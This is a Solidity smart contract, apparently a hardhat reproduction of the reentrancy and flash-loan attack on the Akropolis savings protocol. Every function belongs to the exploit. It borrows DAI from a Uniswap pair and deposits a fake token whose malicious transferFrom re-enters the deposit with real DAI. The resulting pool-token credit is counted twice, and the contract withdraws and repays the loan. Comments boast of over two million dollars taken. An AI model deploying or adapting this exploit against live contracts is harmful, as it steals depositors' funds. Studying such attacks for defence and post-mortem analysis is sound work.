//SPDX-License-Identifier: Unlicense
pragma solidity ^0.7.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./ISavingsModule.sol";
import "./IUniswapV2Pair.sol";



contract Arr is ERC20 {

  // AKRO contract
  ISavingsModule savingsModule = ISavingsModule(0x73fC3038B4cD8FfD07482b92a52Ea806505e5748);
  // DAI/WETH pair for flashloan
  IUniswapV2Pair pair = IUniswapV2Pair(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11);

  // one of the supported protocols:
  address curveYPool = 0x7967adA2A32A633d5C055e2e075A83023B632B4e;
  // pool token for ^^
  address delphiYPool = 0x2AFA3c8Bf33E65d5036cD0f1c3599716894B3077; 

  ERC20 dai = ERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F); 
  ERC20 delphiYPoolToken = ERC20(delphiYPool);

  uint borrow = 24000*10**18;

  constructor() payable ERC20("Exploit", "XPLT") {
    // doing all the approvals here:
    // approve the akro contract to transfer our DAI 
    dai.approve(address(savingsModule), uint(-1));
    // approve the Uni transfer our DAI
    dai.approve(address(pair), uint(-1));
    // approve akro to swap our pool tokens
    delphiYPoolToken.approve(address(savingsModule), uint(-1));
    console.log("Pool token balance: ", delphiYPoolToken.balanceOf(address(this)));
    console.log("DAI balance: ", dai.balanceOf(address(this)));

 }

  // call this to start the hack
  function plunder() external {
    // take out a dai loan:
    pair.swap(borrow, 0, address(this), "0x");
    // ^^ will call uniswapV2Call
  }

  function uniswapV2Call(address,uint,uint,bytes calldata) external {
    // we have our dai now, so we enter the akro protocol with our fake call:
    uint[] memory amountsIn = new uint[](1);
    amountsIn[0] = 5000000*10**18;
    address[] memory tokensIn = new address[](1);
    tokensIn[0] = address(this);    
    console.log("First deposit called now. Should head to savingsModule and come back thru transferFrom");
    savingsModule.deposit(curveYPool, tokensIn, amountsIn);
    // ^^ off to savingsModule, will come back to us in transferFrom.
    
    console.log("First deposit (fake token) is done.");
    
    // now back, we need to withdraw our DAI:
    savingsModule.withdraw(curveYPool, address(dai), borrow, 0);   

    // and return the loan:
    uint toReturn = (borrow * 10035) / 10000;
    dai.transfer(msg.sender, toReturn);    
  }

  // transferFrom, a.k.a. "Eye am the Captain now".
  // this will be the malicious implementation *one million dollars* (actually it was >2!!)
  function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    console.log("Back in transferFrom from savingsModule.");

    // savingsModule comes here looking for it's tokens. Fat chance:
    console.log("DAI balance: ", dai.balanceOf(address(this)));

    uint[] memory amountsIn = new uint[](1);
    amountsIn[0] = borrow;
    address[] memory tokensIn = new address[](1);
    tokensIn[0] = address(dai);    
    savingsModule.deposit(curveYPool, tokensIn, amountsIn);  
    //^^ this sends the contract back to savingsModule who will 
    // move our DAI. But.. we should have double the pool tokens now. 
  
    console.log("Second deposit (dai) is done.");
    console.log("Pool token balance: ", delphiYPoolToken.balanceOf(address(this)));
    console.log("DAI balance: ", dai.balanceOf(address(this))); 

    return true;
    // ^^ We return true and head back to savingsModule, to finish the
    // first deposit call and should end up back in our uniswapV2Call.  
  }

  receive() external payable {}

}
